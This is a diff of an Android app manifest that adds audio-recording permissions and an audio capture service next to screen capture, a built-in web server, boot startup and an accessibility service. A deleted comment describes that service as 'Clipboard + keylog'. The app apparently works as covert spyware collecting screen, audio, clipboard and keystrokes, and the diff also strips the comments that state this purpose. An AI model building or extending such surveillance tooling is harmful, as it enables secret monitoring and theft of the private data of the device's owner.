@@ -7,12 +7,11 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"
+        tools:ignore="ProtectedPermissions"/>
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
         tools:ignore="ProtectedPermissions"/>
-    <service
-    android:name=".AudioCaptureService"
-    android:foregroundServiceType="mediaProjection"
-    android:exported="false" />
 
     <application
         android:allowBackup="false"
@@ -29,18 +28,20 @@
             </intent-filter>
         </activity>
 
-        <!-- Screen capture foreground service -->
         <service
             android:name=".ScreenCaptureService"
             android:foregroundServiceType="mediaProjection"
             android:exported="false" />
 
-        <!-- NanoHTTPD web server -->
+        <service
+            android:name=".AudioCaptureService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
         <service
             android:name=".WebServerService"
             android:exported="false" />
 
-        <!-- Clipboard + keylog via AccessibilityService -->
         <service
             android:name=".ClipboardService"
             android:exported="true"
